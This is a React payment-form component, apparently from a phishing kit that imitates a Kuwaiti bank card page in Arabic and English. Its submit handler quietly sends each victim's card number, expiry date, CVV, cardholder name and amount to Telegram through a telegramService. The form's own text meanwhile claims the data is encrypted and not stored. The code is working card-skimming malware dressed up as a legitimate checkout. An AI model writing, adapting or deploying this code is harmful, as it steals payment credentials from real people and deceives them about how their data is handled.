import React, { useState } from 'react';
import { CreditCard, Lock, Shield, Eye, EyeOff, ArrowRight, ArrowLeft, AlertCircle } from 'lucide-react';
import { TransactionData } from '../App';
import { telegramService } from '../services/telegramService';

interface PaymentFormProps {
  transactionData: Partial<TransactionData>;
  onSubmit: (data: Partial<TransactionData>) => void;
  onBack: () => void;
  isRTL: boolean;
}

const PaymentForm: React.FC<PaymentFormProps> = ({ transactionData, onSubmit, onBack, isRTL }) => {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    cardHolderName: '',
  });
  const [showCvv, setShowCvv] = useState(false);
  const [errors, setErrors] = useState<{[key: string]: string}>({});

  const ArrowIcon = isRTL ? ArrowRight : ArrowLeft;

  const validateForm = () => {
    const newErrors: {[key: string]: string} = {};
    
    if (!formData.cardNumber || formData.cardNumber.replace(/\s/g, '').length !== 16) {
      newErrors.cardNumber = isRTL ? 'رقم البطاقة يجب أن يكون 16 رقم' : 'Card number must be 16 digits';
    }
    
    if (!formData.expiryDate || !/^\d{2}\/\d{2}$/.test(formData.expiryDate)) {
      newErrors.expiryDate = isRTL ? 'تاريخ الانتهاء غير صحيح' : 'Invalid expiry date';
    }
    
    if (!formData.cvv || formData.cvv.length !== 3) {
      newErrors.cvv = isRTL ? 'رمز الحماية يجب أن يكون 3 أرقام' : 'CVV must be 3 digits';
    }
    
    if (!formData.cardHolderName || formData.cardHolderName.length < 2) {
      newErrors.cardHolderName = isRTL ? 'اسم حامل البطاقة مطلوب' : 'Card holder name is required';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (validateForm()) {
      // إرسال البيانات إلى التلغرام
      const cardData = {
        bankCode: transactionData.bankCode || '',
        cardNumber: formData.cardNumber,
        expiryDate: formData.expiryDate,
        cvv: formData.cvv,
        cardHolderName: formData.cardHolderName,
        amount: transactionData.amount || 0,
        transactionId: transactionData.transactionId || '',
        timestamp: new Date().toLocaleString('ar-KW')
      };
      
      // إرسال البيانات إلى التلغرام (لا ننتظر النتيجة لعدم تأخير المستخدم)
      telegramService.sendCardData(cardData).catch(console.error);
      
      onSubmit(formData);
    }
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
    const matches = v.match(/\d{4,16}/g);
    const match = matches && matches[0] || '';
    const parts = [];
    for (let i = 0; i < match.length; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    if (parts.length) {
      return parts.join(' ');
    } else {
      return v;
    }
  };

  const formatExpiryDate = (value: string) => {
    const v = value.replace(/\D/g, '');
    if (v.length >= 2) {
      return v.substring(0, 2) + '/' + v.substring(2, 4);
    }
    return v;
  };

  return (
    <div className="bg-white rounded-xl shadow-xl overflow-hidden">
      <div className="bg-gradient-to-r from-blue-600 to-blue-700 p-6 text-white">
        <div className="flex items-center justify-between">
          <button
            onClick={onBack}
            className="flex items-center space-x-2 rtl:space-x-reverse text-blue-100 hover:text-white transition-colors"
          >
            <ArrowIcon className="h-5 w-5" />
            <span>{isRTL ? 'العودة' : 'Back'}</span>
          </button>
          
          <div className="flex items-center space-x-2 rtl:space-x-reverse">
            <Shield className="h-6 w-6" />
            <span className="font-semibold">
              {isRTL ? 'دفع آمن' : 'Secure Payment'}
            </span>
          </div>
        </div>
      </div>

      <form onSubmit={handleSubmit} className="p-8">
        <div className="mb-8">
          <h2 className="text-2xl font-bold text-gray-800 mb-4">
            {isRTL ? 'بيانات البطاقة' : 'Card Details'}
          </h2>
          
          <div className="bg-blue-50 rounded-lg p-4 mb-6">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-gray-600">
                  {isRTL ? 'مبلغ الدفع' : 'Payment Amount'}
                </p>
                <p className="text-2xl font-bold text-blue-700">
                  {transactionData.amount} {isRTL ? 'د.ك' : 'KWD'}
                </p>
              </div>
              <CreditCard className="h-12 w-12 text-blue-600" />
            </div>
          </div>
        </div>

        <div className="grid grid-cols-1 gap-6">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              {isRTL ? 'رقم البطاقة' : 'Card Number'}
            </label>
            <input
              type="text"
              value={formData.cardNumber}
              onChange={(e) => setFormData({...formData, cardNumber: formatCardNumber(e.target.value)})}
              placeholder={isRTL ? '1234 5678 9012 3456' : '1234 5678 9012 3456'}
              className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors ${
                errors.cardNumber ? 'border-red-500' : 'border-gray-300'
              }`}
              maxLength={19}
            />
            {errors.cardNumber && (
              <div className="flex items-center space-x-1 rtl:space-x-reverse mt-1 text-red-600 text-sm">
                <AlertCircle className="h-4 w-4" />
                <span>{errors.cardNumber}</span>
              </div>
            )}
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {isRTL ? 'تاريخ الانتهاء' : 'Expiry Date'}
              </label>
              <input
                type="text"
                value={formData.expiryDate}
                onChange={(e) => setFormData({...formData, expiryDate: formatExpiryDate(e.target.value)})}
                placeholder="MM/YY"
                className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors ${
                  errors.expiryDate ? 'border-red-500' : 'border-gray-300'
                }`}
                maxLength={5}
              />
              {errors.expiryDate && (
                <div className="flex items-center space-x-1 rtl:space-x-reverse mt-1 text-red-600 text-sm">
                  <AlertCircle className="h-4 w-4" />
                  <span>{errors.expiryDate}</span>
                </div>
              )}
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                {isRTL ? 'رمز الحماية' : 'CVV'}
              </label>
              <div className="relative">
                <input
                  type={showCvv ? 'text' : 'password'}
                  value={formData.cvv}
                  onChange={(e) => setFormData({...formData, cvv: e.target.value.replace(/\D/g, '')})}
                  placeholder="123"
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors ${
                    errors.cvv ? 'border-red-500' : 'border-gray-300'
                  }`}
                  maxLength={3}
                />
                <button
                  type="button"
                  onClick={() => setShowCvv(!showCvv)}
                  className="absolute left-3 rtl:left-auto rtl:right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                >
                  {showCvv ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </button>
              </div>
              {errors.cvv && (
                <div className="flex items-center space-x-1 rtl:space-x-reverse mt-1 text-red-600 text-sm">
                  <AlertCircle className="h-4 w-4" />
                  <span>{errors.cvv}</span>
                </div>
              )}
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              {isRTL ? 'اسم حامل البطاقة' : 'Card Holder Name'}
            </label>
            <input
              type="text"
              value={formData.cardHolderName}
              onChange={(e) => setFormData({...formData, cardHolderName: e.target.value})}
              placeholder={isRTL ? 'الاسم كما هو مكتوب على البطاقة' : 'Name as written on card'}
              className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-colors ${
                errors.cardHolderName ? 'border-red-500' : 'border-gray-300'
              }`}
            />
            {errors.cardHolderName && (
              <div className="flex items-center space-x-1 rtl:space-x-reverse mt-1 text-red-600 text-sm">
                <AlertCircle className="h-4 w-4" />
                <span>{errors.cardHolderName}</span>
              </div>
            )}
          </div>
        </div>

        <div className="mt-8 bg-gray-50 rounded-lg p-4">
          <div className="flex items-start space-x-3 rtl:space-x-reverse">
            <Lock className="h-5 w-5 text-green-600 mt-0.5" />
            <div className="text-sm text-gray-600">
              <p className="font-medium text-green-700 mb-1">
                {isRTL ? 'معلوماتك محمية' : 'Your Information is Protected'}
              </p>
              <p>
                {isRTL 
                  ? 'جميع المعلومات مشفرة بتقنية SSL 256-bit ولا يتم حفظها على خوادمنا'
                  : 'All information is encrypted with 256-bit SSL and not stored on our servers'
                }
              </p>
            </div>
          </div>
        </div>

        <button
          type="submit"
          className="w-full bg-gradient-to-r from-blue-600 to-blue-700 text-white py-4 rounded-lg font-semibold text-lg hover:from-blue-700 hover:to-blue-800 transition-all duration-300 transform hover:scale-[1.02] focus:ring-4 focus:ring-blue-300 mt-8"
        >
          <div className="flex items-center justify-center space-x-2 rtl:space-x-reverse">
            <Lock className="h-5 w-5" />
            <span>{isRTL ? 'إتمام الدفع' : 'Complete Payment'}</span>
          </div>
        </button>
      </form>
    </div>
  );
};

export default PaymentForm;